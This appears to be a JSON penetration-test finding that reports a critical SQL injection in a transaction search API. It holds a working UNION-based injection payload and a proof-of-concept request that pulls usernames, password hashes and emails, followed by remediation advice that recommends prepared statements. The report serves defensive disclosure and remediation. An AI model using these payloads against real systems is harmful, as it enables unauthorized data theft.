{
  "pentest_id": "pt-2025-001",
  "finding_id": "PT-2025-001-F001",
  "title": "SQL Injection in Transaction Search",
  "severity": "critical",
  "cvss": {
    "version": "3.1",
    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "score": 9.9
  },
  "category": "injection",
  "cwe": "CWE-89",
  "owasp": "A03:2021-Injection",
  "description": "A SQL injection vulnerability was identified in the transaction search endpoint. The 'transaction_id' parameter is directly concatenated into the SQL query without proper sanitization, allowing an authenticated attacker to execute arbitrary SQL commands.",
  "technical_details": {
    "affected_endpoint": "POST /v1/transactions/search",
    "vulnerable_parameter": "transaction_id",
    "payload_used": "' OR '1'='1' UNION SELECT * FROM users--",
    "database_type": "PostgreSQL",
    "authentication_required": true
  },
  "proof_of_concept": {
    "request": "POST /v1/transactions/search HTTP/1.1\nHost: staging-api.example.com\nAuthorization: Bearer <token>\nContent-Type: application/json\n\n{\"transaction_id\": \"' OR '1'='1' UNION SELECT username, password, email, null, null FROM users--\"}",
    "response": "HTTP/1.1 200 OK\n\n{\"results\": [{\"username\": \"admin\", \"password\": \"$2b$12$...\", \"email\": \"admin@example.com\"}]}",
    "screenshots": ["sqli_poc_1.png", "sqli_poc_2.png"],
    "video": "sqli_demonstration.mp4"
  },
  "impact": {
    "confidentiality": "high",
    "integrity": "high",
    "availability": "high",
    "business_impact": "An attacker could extract all customer data including payment information, modify transaction records, or delete critical data. This could result in significant financial loss, regulatory penalties, and reputational damage."
  },
  "remediation": {
    "recommendation": "Use parameterized queries or prepared statements instead of string concatenation. Implement input validation and sanitization. Apply the principle of least privilege to database accounts.",
    "code_example": "// Instead of:\nString query = \"SELECT * FROM transactions WHERE id = '\" + transactionId + \"'\";\n\n// Use:\nPreparedStatement stmt = conn.prepareStatement(\"SELECT * FROM transactions WHERE id = ?\");\nstmt.setString(1, transactionId);",
    "references": [
      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/89.html"
    ],
    "effort_estimate": "low",
    "priority": "immediate"
  },
  "status": "confirmed",
  "discovered_date": "2025-01-21",
  "tester": "security-tester@example.com"
}
